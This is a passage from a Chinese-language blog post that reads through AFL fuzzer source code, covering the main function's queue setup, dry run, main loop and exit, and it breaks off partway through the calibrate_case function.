class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"><span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123; <span class="comment">// shuffle_queue通过环境变量进行定义的</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">  <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt); <span class="comment">// 随机打乱顺序</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.txt&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>scandir</code> 函数调用的作用是扫描in_dir的目录结构，经过第三个参数也就是select函数的挑选之后，按照第四个参数给定的排序规则存储到第二个参数指向的内存空间中。这里我们的排序参数是<code>alphasort</code> 其就是按照字母顺序进行一个排序。</p><p>接着就是判断是否要随机打乱顺序。之后对获取得到的文件路径依次调用access函数看是否可以访问，以及是否可以访问对应的<code>in_dir/.state/deterministic_done/file_name</code> 文件，如果这个文件存在那么这里表示的是确定性变异已经完成了，此时这个文件送入队列的时候就会标记<code>passed_det</code> 表示跳过确定性变异的阶段。</p><p>读取完毕测试用例之后即会调用<code>load_auto</code> 函数在<code>in_dir/.state/auto_extras/auto_%06u</code> 所表示的文件，对其调用<code>maybe_add_auto</code> 函数按照规则加入到字典中。</p><p><code>pivot_inputs</code> 函数用于在输出文件夹中创建测试用例的硬链接。这里的命名规则如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果SIMPLE_FILE定义了</span></span><br><span class="line"><span class="string">&quot;in_dir/queue/id:%06u&quot;</span> % id</span><br><span class="line"><span class="comment">// 如果SIMPLE_FILE没有定义</span></span><br><span class="line"><span class="string">&quot;in_dir/queue/id:%06u,orig:%s&quot;</span> % id, use_name</span><br></pre></td></tr></table></figure><p>如果测试用例标记了跳过确定性变异，那么就生成对应的<code>out_dir/queue/.state/deterministic_done/file_name</code> 文件。最后调用<code>nuke_resume_dir</code> 函数删除<code>out_dir/_resume/.state/</code> 下面的所有的临时文件夹。</p><p>后续还包含设置启动时间，检查目标程序的信息等步骤。</p><h2 id="Dry-Run"><a href="#Dry-Run" class="headerlink" title="Dry Run"></a>Dry Run</h2><p>在一切都准备好之后，接下来就开始跑第一轮的fuzz，代码如下</p><ul><li>main函数DryRun部分  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">perform_dry_run</span>(use_argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">show_init_stats</span>();</span><br><span class="line"></span><br><span class="line">seek_to = <span class="built_in">find_start_position</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">4</span>);</span><br><span class="line">  start_time += <span class="number">4000</span>;</span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里首先调用的是<code>perform_dry_run</code> 函数，该函数就会依次读取queue中的内容，对其中的每一个测试文件调用<code>calibrate_case</code> 函数进行校准。此时目标程序至少执行一次测试用例。然后根据返回结果来判断发生错误的类型。</p><p>接着调用的是<code>cull_queue</code> 函数，该函数的作用是精简队列，也就是执行优胜者策略，选出最受欢迎的优胜者测试用例。</p><p>接着调用<code>show_init_stats</code> 函数输出这一轮的Fuzz相关的信息。输出完毕之后调用<code>find_start_position</code> 函数从<code>out_dir/fuzzer_stats</code> 中<code>cur_path</code> 找到当前的测试用例，并从这个测试用例开始。接着调用<code>write_stats_file</code> 函数更新<code>out_dir/fuzzer_stats</code> 文件，这里我们可以看到<code>out_dir/fuzzer_stats</code> 文件中存储的信息</p><ul><li><code>out_dir/fuzzer_stats</code> 文件内容  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">&quot;start_time        : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;last_update       : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;fuzzer_pid        : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;cycles_done       : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;execs_done        : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;execs_per_sec     : %0.02f\n&quot;</span></span><br><span class="line">           <span class="string">&quot;paths_total       : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;paths_favored     : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;paths_found       : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;paths_imported    : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;max_depth         : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;cur_path          : %u\n&quot;</span> <span class="comment">/* Must match find_start_position() */</span></span><br><span class="line">           <span class="string">&quot;pending_favs      : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;pending_total     : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;variable_paths    : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;stability         : %0.02f%%\n&quot;</span></span><br><span class="line">           <span class="string">&quot;bitmap_cvg        : %0.02f%%\n&quot;</span></span><br><span class="line">           <span class="string">&quot;unique_crashes    : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;unique_hangs      : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;last_path         : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;last_crash        : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;last_hang         : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;execs_since_crash : %llu\n&quot;</span></span><br><span class="line">           <span class="string">&quot;exec_timeout      : %u\n&quot;</span></span><br><span class="line">           <span class="string">&quot;afl_banner        : %s\n&quot;</span></span><br><span class="line">           <span class="string">&quot;afl_version       : &quot;</span> VERSION <span class="string">&quot;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;target_mode       : %s%s%s%s%s%s%s\n&quot;</span></span><br><span class="line">           <span class="string">&quot;command_line      : %s\n&quot;</span>,</span><br><span class="line">           start_time / <span class="number">1000</span>, <span class="built_in">get_cur_time</span>() / <span class="number">1000</span>, <span class="built_in">getpid</span>(),</span><br><span class="line">           queue_cycle ? (queue_cycle - <span class="number">1</span>) : <span class="number">0</span>, total_execs, eps,</span><br><span class="line">           queued_paths, queued_favored, queued_discovered, queued_imported,</span><br><span class="line">           max_depth, current_entry, pending_favored, pending_not_fuzzed,</span><br><span class="line">           queued_variable, stability, bitmap_cvg, unique_crashes,</span><br><span class="line">           unique_hangs, last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>,</span><br><span class="line">           last_hang_time / <span class="number">1000</span>, total_execs - last_crash_execs,</span><br><span class="line">           exec_tmout, use_banner,</span><br><span class="line">           qemu_mode ? <span class="string">&quot;qemu &quot;</span> : <span class="string">&quot;&quot;</span>, dumb_mode ? <span class="string">&quot; dumb &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           no_forkserver ? <span class="string">&quot;no_forksrv &quot;</span> : <span class="string">&quot;&quot;</span>, crash_mode ? <span class="string">&quot;crash &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           persistent_mode ? <span class="string">&quot;persistent &quot;</span> : <span class="string">&quot;&quot;</span>, deferred_mode ? <span class="string">&quot;deferred &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">            persistent_mode || deferred_mode) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">           orig_cmdline);</span><br><span class="line">           <span class="comment">/* ignore errors */</span></span><br></pre></td></tr></table></figure></li></ul><p>更新完毕文件内容之后即调用<code>save_auto</code> 函数保存这一轮产生的Token的信息。这些Token和词法分析中的Token概念相似，用来作为字典指导变异。</p><h2 id="Main-Loop"><a href="#Main-Loop" class="headerlink" title="Main Loop"></a>Main Loop</h2><p>前面需要首先执行一次Fuzz的目的实际上就是去判断我们输入的测试用例的情况，如果存在某些错误的话，那么这里将会直接Stop。执行完毕首轮Fuzz之后接下来就进入到了Main Loop中，也就是Fuzz的主逻辑中。</p><ul><li>main函数中Main Loop部分代码  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = queue;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        <span class="built_in">ACTF</span>(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><p>首先这里会调用<code>cull_queue</code> 函数，也就是在每次循环之前都会进行一下队列的精简。</p><p>接着存在一个对<code>queue_cur</code> 的判断，如果<code>queue_cur</code> 是空的话，那么就表示当前的队列已经遍历完毕了因此这里需要初始化到队列的首部进行重新遍历。在进行队列初始化的时候会判断当前队列和上一个队列是否完全相同，如果完全相同的话，那么就表示这一轮的Fuzz是没有效果的，这里就需要进行变异策略的重组。</p><p>接着调用<code>fuzz_one</code> 函数对目标程序执行一次Fuzz，Fuzz结束之后会首先去判断<code>stop_soon</code> 的值也就是是否结束Fuzz，如果不结束的话那么就移动<code>queue_cur</code> 队列指针指向下一个测试用例，继续执行循环。</p><p>这里有两种方式去设置<code>stop_soon</code> 的值，一种是程序错误，另一种是用户发送某些信号例如ctrl-c，通过handler对<code>stop_soon</code> 进行了设置。</p><h2 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h2><p>这一部分就是退出AFL的过程了，这里就保存一些相关的文件例如bitmap等，然后关闭程序</p><ul><li>main函数Exit部分代码  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_bitmap</span>();</span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line"><span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">     stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(plot_file);</span><br><span class="line"><span class="built_in">destroy_queue</span>();</span><br><span class="line"><span class="built_in">destroy_extras</span>();</span><br><span class="line"><span class="built_in">ck_free</span>(target_path);</span><br><span class="line"><span class="built_in">ck_free</span>(sync_id);</span><br><span class="line"></span><br><span class="line"><span class="built_in">alloc_report</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">OKF</span>(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li></ul><p>这里会先保存bitmap、以及当前的fuzz的状态以及Token的信息。接着释放一些全局变量的内存，之后调用exit进行退出。</p><h1 id="DryRun与MainLoop代码中的一些关键函数"><a href="#DryRun与MainLoop代码中的一些关键函数" class="headerlink" title="DryRun与MainLoop代码中的一些关键函数"></a>DryRun与MainLoop代码中的一些关键函数</h1><p>前面我们只是分析了一下main函数的整体的流程，对于一些细节的部分和一些关键的函数，我们这里再分析一下</p><h2 id="calibrate-case-函数"><a href="#calibrate-case-函数" class="headerlink" title="calibrate_case 函数"></a>calibrate_case 函数</h2><p>前面我们说到在进行第一次Fuzz Run的时候也就是DryRun的时候首先会调用<code>perform_dry_run</code> 函数去对测试用例进行校准。这里我们需要看一下这个测试用例的校准的函数。</p><ul><li>calibrate_case函数  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Calibrate a new test case. This is done when processing the input directory</span></span><br><span class="line"><span class="comment">   to warn about flaky or otherwise problematic test cases early on; and when</span></span><br><span class="line"><span class="comment">   new paths are discovered to detect variable behavior and so on. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault = <span class="number">0</span>, new_bits = <span class="number">0</span>, var_detected = <span class="number">0</span>,</span><br><span class="line">      first_run = (q-&gt;exec_cksum == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc = stage_cur, old_sm = stage_max;</span><br><span class="line">  u32 use_tmout = exec_tmout;</span><br><span class="line">  u8* old_sn = stage_name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span></span><br><span class="line"><span class="comment">     trying to calibrate already-added finds. This helps avoid trouble due</span></span><br><span class="line"><span class="comment">     to intermittent latency. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout = <span class="built_in">MAX</span>(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC / <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name = <span class="string">&quot;calibration&quot;</span>;</span><br><span class="line">  stage_max  = fast_cal ? <span class="number">3</span> : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span></span><br><span class="line"><span class="comment">     count its spin-up time toward binary calibration. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode != <span class="number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    <span class="built_in">init_forkserver</span>(argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;exec_cksum) <span class="built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  start_us = <span class="built_in">get_cur_time_us</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">write_to_testcase</span>(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault = <span class="built_in">run_target</span>(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span></span><br><span class="line"><span class="comment">       we want to bail out quickly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon || fault != crash_mode) <span class="keyword">goto</span> abort_calibration;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode 